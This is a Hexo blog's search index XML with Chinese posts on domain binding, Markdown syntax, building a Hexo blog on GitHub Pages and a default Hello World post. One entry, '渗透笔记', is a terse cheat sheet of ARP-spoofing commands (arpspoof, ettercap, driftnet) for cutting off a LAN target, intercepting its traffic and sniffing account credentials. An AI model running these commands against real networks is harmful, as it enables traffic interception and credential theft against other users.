<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[域名绑定]]></title>
    <url>%2F2018%2F05%2F22%2F%E5%9F%9F%E5%90%8D%E7%BB%91%E5%AE%9A%2F</url>
    <content type="text"><![CDATA[域名绑定在这之前你已经搭建好了博客，已经可以通过类似：https://junnochen.github.io/的方法访问。 1.没有域名的话先去申请一个域名2.添加域名解析ping你的http://github.io域名，得到一个IP；修改域名解析记录； 在仓库里添加CNAME文件并在文件中填写绑定的域名 文件里填写要绑定的域名且不要包含Http://和www进入设置，找到 Custom domain添加域名后保存]]></content>
  </entry>
  <entry>
    <title><![CDATA[MarkDown语法]]></title>
    <url>%2F2018%2F05%2F09%2FMarkDown%E8%AF%AD%E6%B3%95%2F</url>
    <content type="text"><![CDATA[Markdown 表示超链接 ##大标题 ###小标题blah blah blah 空格 中文全角空格表示文章标题 内容 区块引用1 23列表 内容* 表示强调内容 图片]]></content>
  </entry>
  <entry>
    <title><![CDATA[利用开源框架搭建自己的博客]]></title>
    <url>%2F2018%2F05%2F08%2F%E5%88%A9%E7%94%A8%E5%BC%80%E6%BA%90%E6%A1%86%E6%9E%B6%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%8D%9A%E5%AE%A2%2F</url>
    <content type="text"><![CDATA[为什么要创建一个自己的博客？基于我自己的理解来说，对于一个技术人员，在技术成长的道路中，你肯定会遇到各种各样的问题，为了保证下次遇到同样的问题不会重复浪费时间，就可以把把这些问题记录了下来，防止再次碰到同样的问题还是一头雾水，这样太过浪费时间了。同时你的分享也许会对别人产生帮助。而对于一个非技术人员来说，我保证你在自己的博客发文章跟写说说或者朋友圈有不一样的体验，也就是给地主种地和自己分得了一块地的区别。如果你有兴趣试一下的话，那就跟着下面慢慢来。。。 1.首先你会问我不懂代码怎么办？没关系的，有好多的优秀开源框架可以供我们来使用。什么是开源？简单的说是那些大佬们做好的一些东西，并且直接把源代码放了出来，我们可以去免费使用。至于框架？比如你要盖一个房子，但是你不会，你就可以把框架找来，他已经具备一个房子的模型了但是还可以随意更改，你要做的就是告诉他我要几层的，然后墙壁要什么颜色，地板要什么样的，当你设置完所有的属性后，一个属于你自己的房子就好了，至于他是怎么去铺地板和刷墙的，我们就不需要知道了。在这里我选取的框架是Hexo，因为刚了解了NODEJS，比较熟悉NPM，至于这是神码我们后面会遇到。 2.不知道大家有没有接触过LINUX。现在我们基于WINDOWS来开始。首先你需要Nodejs，因为这个框架是需要这个东西的，至于他是什么自己去了解。而他的安装也是很简单的。直接搜一下，然后上去他的官网，英文网站也不用怕，因为你只需要找Download。然后找到适合自己电脑的版本。安装过程和大多数软件一样，一路next就行了。安装好以后可以在自己的命令行里面试一下（node -v）如果返回软件版本号就好了。 3.下面我们需要用到Git，当然我们只是使用它一些比较简单的功能。下载安装和普通的软件也一样。安装好以后点一下鼠标右键你会发现多了两个选项（git bash here git GUI here）第一个是用命令行的方式使用，第二个是使用图形界面。在哪个界面下点右键就是在那个路径下使用git，推荐使用命令行方式，简单方便。 4.上面都好了以后我们就可以开始使用HEXO了，首先找一个合适的位置存放你的文件，你可以选择任意一个盘下面。然后用鼠标右键打开git的命令行界面，然后我们可以使用npm来安装Hexo。在整个项目中我们安装东西都使用npm，我们输入（npm install -g hexo），回车等待安装完成。安装好了以后我们就可以进行初始化了。 5.接着我们进行初始化，接着输入命令（hexo init blog）回车以后等待完成之后你会发现多了一个blog文件夹，这个就是我们的项目文件。接着我们进入文件夹，输入命令（cd blog）进去以后我们执行(npm install)他会自动帮助我们安装好这个项目所有需要的模块。完成之后，我们可以输入（hexo server）此时如果没有报错我们可以看到我们的服务在本地开始运行了，我们可以打开浏览器输入（localhost:4000）回车后我们就能看helloworld界面了。至此我们已经小功告成了。我们在命令行中ctril+c就停止了服务。 6.我们的服务已经好了，接下来就是修改配置文件，让他变成我们自己的。观察整个目录结构，我们会发现一个_config.yml，这就是主要的配置信息，我们用合适的文本编辑器打开他，里面是一项项的配置信息，我们不用全部都看懂，我们只需要知道修改几个关键的地方就行了。首先在 #Site 项里面我们修改标题和作者。其他的我们暂时不用管。 7.我们如何写东西呢？我们所有的文章全部都在 Hexo\source_posts ，里面的.md后缀就是我们的文章，我们可以手动向里面添加我们写好的文件，也可以用命令（hexo new + 文章标题）来自动产生。所有的都弄好以后，我们希望所有的人都能访问到我们的博客，我们可以选择部署到服务器上，当然免费使用github是个不错的选择.Hexo也支持我们去往那里部署，并且命令简单。 8.我们需要去github上进行sign up，注册完成后我们可以建立我们自己的一个仓库，因为我们这个仓库是要放自己的博客的，所以仓库的名字要写成（username.github.io）创建好仓库后，我们就要告诉我们的项目，我要把你们部署到github上去了，还记得之前我们的那个配置文件_config.yml吗？在他的最下面有#Deployment这一项，在下面的type里写上git， 在repo项粘上我们的仓库链接就好了。下面我们就可以发布了，在你的git命令行里面打上（hexo clean &amp;&amp; hexo g &amp;&amp; hexo d）会提示你输入你的帐号的用户名和邮箱，然后就发布好了。这时在你的浏览器输入（username.github.io）你的博客就ok了。然后你就可以在本地写好你的文章然后重新部署一遍就好了。 9.Hexo上面也支持各种各样很酷的主题，如果你还想让他变得更酷一点，你就可以去找找主题，然后查查都是怎么用的。相信我，探索的乐趣是无穷的，而当你客服困难最终完成你的作品后那种满足感也是无与伦比的。 优秀的人，不是不合群，而是他们合群的人里面没有你]]></content>
  </entry>
  <entry>
    <title><![CDATA[渗透笔记]]></title>
    <url>%2F2018%2F03%2F30%2F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[看局域网ip: fping -asg 192.168.1.0 /24断网：arpspoof -i eth0(网卡) -t 目标ip 网关 . （欺骗 进行ip流量地址转发：echo 1&gt;/proc/sys/net/ipv4/ip_forward 或sysctl -w net.ipv4.ip_forward=1arpspoof -i eth0(网卡) -t 目标ip 网关 ettercap -i eth0 -Tp -M arp:remote/192.168.1.101//192.168.1.1//driftnet –i eth0 帐号获取：ettercap -Tq -i eth0 开启ssh： /etc/init.d/ssh start 优秀的人，不是不合群，而是他们合群的人里面没有你]]></content>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2018%2F03%2F30%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
